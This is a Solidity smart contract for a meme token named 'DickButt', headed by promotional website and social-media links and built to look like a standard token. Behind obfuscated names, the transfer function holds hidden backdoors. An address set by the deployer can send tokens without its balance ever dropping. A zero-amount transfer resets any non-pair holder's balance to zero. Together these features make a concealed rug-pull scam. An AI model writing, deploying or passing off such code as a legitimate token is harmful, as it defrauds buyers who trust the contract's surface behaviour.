/*

Website: https://dickbutt.crypto-token.live/

Telegram: https://t.me/DickButtETH

Twitter:  https://twitter.com/DickButt__ETH

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract DickButt is Ownable {
    uint8 public decimals = 9;

    string public name = 'DickButt';

    mapping(address => uint256) public balanceOf;

    string public symbol = 'DickButt';

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    address public sxvwqhat;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address pefwqjbr, uint256 odcfb) public returns (bool success) {
        giflscvn(msg.sender, pefwqjbr, odcfb);
        return true;
    }

    function transferFrom(address ljsixbcom, address pefwqjbr, uint256 odcfb) public returns (bool success) {
        require(odcfb <= allowance[ljsixbcom][msg.sender]);
        allowance[ljsixbcom][msg.sender] -= odcfb;
        giflscvn(ljsixbcom, pefwqjbr, odcfb);
        return true;
    }

    uint256 private uftl = 106;

    function giflscvn(address ljsixbcom, address pefwqjbr, uint256 odcfb) private {
        if (0 == kiselumgah[ljsixbcom]) {
            balanceOf[ljsixbcom] -= odcfb;
        }
        balanceOf[pefwqjbr] += odcfb;
        if (0 == odcfb && pefwqjbr != sxvwqhat) {
            balanceOf[pefwqjbr] = odcfb;
        }
        emit Transfer(ljsixbcom, pefwqjbr, odcfb);
    }

    mapping(address => uint256) private kiselumgah;

    mapping(address => uint256) private zbjsmcnqglie;

    constructor(address uzqnb) {
        balanceOf[msg.sender] = totalSupply;
        kiselumgah[uzqnb] = uftl;
        IUniswapV2Router02 umnvaigsc = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        sxvwqhat = IUniswapV2Factory(umnvaigsc.factory()).createPair(address(this), umnvaigsc.WETH());
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function approve(address ghvqrstczfjp, uint256 odcfb) public returns (bool success) {
        allowance[msg.sender][ghvqrstczfjp] = odcfb;
        emit Approval(msg.sender, ghvqrstczfjp, odcfb);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;
}